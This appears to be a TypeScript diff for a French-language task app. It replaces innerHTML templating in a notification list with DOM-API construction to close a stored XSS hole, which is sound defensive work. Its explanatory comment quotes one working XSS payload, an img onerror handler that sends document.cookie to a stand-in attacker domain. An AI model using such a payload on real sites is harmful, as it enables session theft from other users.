@@ -328,28 +328,57 @@ const initials = displayName.split(' ').map((n: string) => n[0]).join('').toUppe
 
   const typeLabels = { mention: 'Mention', assignment: 'Assignation', deadline: 'Échéance', comment: 'Commentaire' };
 
+  /**
+   * Construit la liste des notifications via l'API DOM, jamais par innerHTML.
+   *
+   * `task_title`, `n.type` et les identifiants viennent de la base et sont
+   * saisis par des benevoles (POST /api/benevole/tasks). L'ancienne version les
+   * interpolait dans une chaine HTML sans echappement : une tache intitulee
+   *     <img src=x onerror=fetch('//evil.tld/?c='+document.cookie)>
+   * s'executait dans le navigateur de l'admin assigne. XSS stockee.
+   *
+   * `textContent` et `dataset` ne peuvent PAS produire de balise : la surete
+   * vient de l'API, pas de la vigilance de celui qui ajoutera le prochain champ.
+   */
   function renderNotifList() {
     if (!listEl) return;
+    listEl.textContent = '';
+
     if (!notifData.length) {
-      listEl.innerHTML = '<li class="notif-empty">Aucune notification.</li>';
+      const empty = document.createElement('li');
+      empty.className = 'notif-empty';
+      empty.textContent = 'Aucune notification.';
+      listEl.append(empty);
       return;
     }
-    listEl.innerHTML = notifData.map(n => {
-      const date    = new Date(n.created_at).toLocaleDateString('fr-FR');
-      const typeLabel = typeLabels[n.type as keyof typeof typeLabels] ?? n.type;
-      const text    = n.type === 'assignment'
-        ? `Vous avez été assigné à "${n.payload?.task_title ?? 'une tâche'}"`
-        : n.type === 'mention'
-        ? `Vous avez été mentionné dans un commentaire`
-        : n.type === 'comment'
-        ? `Nouveau commentaire sur une tâche que vous suivez`
-        : `Notification`;
-      return `<li class="notif-item${n.read ? '' : ' notif-item--unread'}" data-id="${n.id}" data-task-id="${n.payload?.task_id ?? ''}" data-project-id="${n.payload?.project_id ?? ''}">
-        <div class="notif-item-type">${typeLabel}</div>
-        <div class="notif-item-text">${text}</div>
-        <div class="notif-item-date">${date}</div>
-      </li>`;
-    }).join('');
+
+    const div = (className: string, text: string) => {
+      const el = document.createElement('div');
+      el.className = className;
+      el.textContent = text;
+      return el;
+    };
+
+    for (const n of notifData) {
+      const text =
+        n.type === 'assignment' ? `Vous avez été assigné à "${n.payload?.task_title ?? 'une tâche'}"`
+        : n.type === 'mention'  ? 'Vous avez été mentionné dans un commentaire'
+        : n.type === 'comment'  ? 'Nouveau commentaire sur une tâche que vous suivez'
+        : 'Notification';
+
+      const li = document.createElement('li');
+      li.className = `notif-item${n.read ? '' : ' notif-item--unread'}`;
+      li.dataset.id        = n.id;
+      li.dataset.taskId    = n.payload?.task_id ?? '';
+      li.dataset.projectId = n.payload?.project_id ?? '';
+
+      li.append(
+        div('notif-item-type', typeLabels[n.type as keyof typeof typeLabels] ?? n.type),
+        div('notif-item-text', text),
+        div('notif-item-date', new Date(n.created_at).toLocaleDateString('fr-FR')),
+      );
+      listEl.append(li);
+    }
 
     // Click on notification: navigate + mark read
     listEl.querySelectorAll('.notif-item').forEach(item => {
